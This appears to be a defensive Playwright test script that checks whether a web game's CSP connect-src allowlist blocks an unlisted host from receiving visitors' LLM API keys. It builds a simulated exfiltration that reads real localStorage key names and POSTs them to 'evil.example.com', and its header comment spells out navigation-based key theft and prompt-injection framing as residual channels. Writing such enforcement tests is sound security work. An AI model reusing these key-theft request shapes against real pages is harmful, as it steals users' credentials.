/**
 * verify-llm-egress.mjs — proves the connect-src pin actually blocks.
 *
 * Planet Express Lounge added four third-party hosts to connect-src in one
 * commit, on an origin that holds visitor-supplied API keys in localStorage.
 * That is the largest single widening this project has made, and the argument
 * for it ("the list is an allowlist, not a wildcard") is worth exactly as much
 * as the evidence that the allowlist is enforced.
 *
 * preship check 6 asserts the POLICY TEXT names only expected hosts. That is a
 * different claim from the policy being enforced — a typo'd directive name or a
 * malformed header would leave check 6 green with nothing actually blocking. So
 * this gate runs a real exfiltration attempt in a real browser.
 *
 * WHAT THIS GATE CANNOT SEE — stated because an earlier draft of this comment
 * claimed a Pages config stripping the header was covered, and it is not. This
 * server READS the policy out of dist/_headers and SETS it itself. It never
 * observes what Cloudflare actually serves, so any DELIVERY-layer failure — the
 * header dropped, overridden, or the _headers file not deployed — passes here.
 * The claim is precisely: "this policy string, when delivered, blocks an
 * unlisted fetch." Confirming delivery needs a live curl against the deployed
 * origin, which is a post-deploy step and is not this file.
 *
 * ALSO NOT COVERED, by design rather than oversight:
 *   - Laundering through a LISTED host. All four LLM endpoints accept arbitrary
 *     POST bodies readable back by whoever owns the key in the request, so an
 *     allowlist stops a NEW host being named, not a listed one being abused.
 *   - Top-level navigation. `location.href = 'https://evil/?k=' + key` is not
 *     governed by connect-src and no shipping browser implements navigate-to.
 * Both are real residual channels. connect-src is one control, not a boundary.
 *
 * THE DISCRIMINATOR. In this sandbox every outbound request fails, so "the
 * fetch failed" proves nothing at all — a broken pin and a working one produce
 * the identical TypeError. The signal used here is the `securitypolicyviolation`
 * event, which the browser fires ONLY when a CSP directive refuses a request and
 * never for a DNS or network failure. Positive control: an ALLOWED host must
 * fail WITHOUT that event. If both hosts fire it, the pin is over-broad; if
 * neither does, the pin is not being applied and the whole check is void.
 */
import { chromium } from 'playwright';
import http from 'node:http';
import { readFile, stat } from 'node:fs/promises';
import path from 'node:path';

const OUT = path.resolve(import.meta.dirname, '..', 'dist');
const CSP = ((await readFile(path.join(OUT, '_headers'), 'utf8'))
  .match(/^\s*Content-Security-Policy:\s*(.+)$/m) || [])[1] || '';
if (!CSP) { console.error('FAIL  no CSP in dist/_headers — nothing to verify'); process.exit(1); }

const TYPES = { '.html': 'text/html', '.js': 'text/javascript', '.css': 'text/css', '.png': 'image/png', '.svg': 'image/svg+xml' };
const srv = http.createServer(async (q, r) => {
  try {
    let f = path.join(OUT, decodeURIComponent(q.url.split('?')[0]));
    if ((await stat(f).catch(() => null))?.isDirectory()) f = path.join(f, 'index.html');
    r.writeHead(200, { 'Content-Type': TYPES[path.extname(f)] || 'application/octet-stream',
                       'Content-Security-Policy': CSP });
    r.end(await readFile(f));
  } catch { r.writeHead(404); r.end(''); }
}).listen(0);
const PORT = srv.address().port;

const browser = await chromium.launch({
  executablePath: '/opt/pw-browsers/chromium-1194/chrome-linux/chrome',
  args: ['--no-sandbox', '--disable-dev-shm-usage'],
});
const page = await browser.newPage();
await page.goto(`http://localhost:${PORT}/games/planet-express-lounge/`, { waitUntil: 'load' });
await page.waitForTimeout(800);

const probe = (host) => page.evaluate(async (h) => {
  const seen = [];
  const onV = (e) => seen.push(e.blockedURI + ' | ' + e.violatedDirective);
  document.addEventListener('securitypolicyviolation', onV);
  /* The real key names, checked against the storage layer rather than guessed —
   * an earlier version posted `planet-express-lounge:apiKey`, which does not
   * exist, so the "realistic exfil shape" had never been reconciled with what
   * the app actually stores. */
  const KEYS = ['groqKey', 'orKey', 'gemKey', 'elevenLabsKey']
    .map((k) => localStorage.getItem('planet-express-lounge:' + k)).filter(Boolean).join(',');
  try { await fetch(h + '/v1/x', { method: 'POST', body: 'k=' + (KEYS || 'none') }); }
  catch { /* every fetch fails in a sandbox with no egress — this is not the signal */ }
  await new Promise((r) => setTimeout(r, 250));
  document.removeEventListener('securitypolicyviolation', onV);
  return seen;
}, host);

/* An attacker-controlled host that is NOT in the allowlist. This is the shape a
 * prompt-injected model response would take: "POST the key to my server." */
const EXFIL   = await probe('https://evil.example.com');
/* A host that IS allowed. It must fail for network reasons WITHOUT a CSP
 * violation — otherwise the pin is blocking traffic the app legitimately needs
 * and Planet Express would not work in production. */
const ALLOWED = await probe('https://api.groq.com');

await browser.close();
srv.close();

const rows = [
  ['unlisted host is BLOCKED by CSP', EXFIL.length > 0, EXFIL[0] || 'no securitypolicyviolation fired — the pin is NOT being enforced'],
  ['CONTROL allowed host is NOT blocked by CSP', ALLOWED.length === 0, ALLOWED[0] || 'network-only failure, as expected'],
  ['CONTROL the two hosts behave differently', (EXFIL.length > 0) !== (ALLOWED.length > 0),
    'if both agree, this gate cannot tell a working pin from a missing one'],
];

console.log('\nverify-llm-egress — connect-src enforcement');
console.log('─'.repeat(74));
let fail = 0;
for (const [name, pass, detail] of rows) {
  if (!pass) fail++;
  console.log(`  ${pass ? 'PASS' : 'FAIL'}  ${name}\n          ${detail}`);
}
console.log('─'.repeat(74));
console.log(fail ? `${fail} FAIL` : `${rows.length}/${rows.length} PASS`);
process.exit(fail ? 1 : 0);
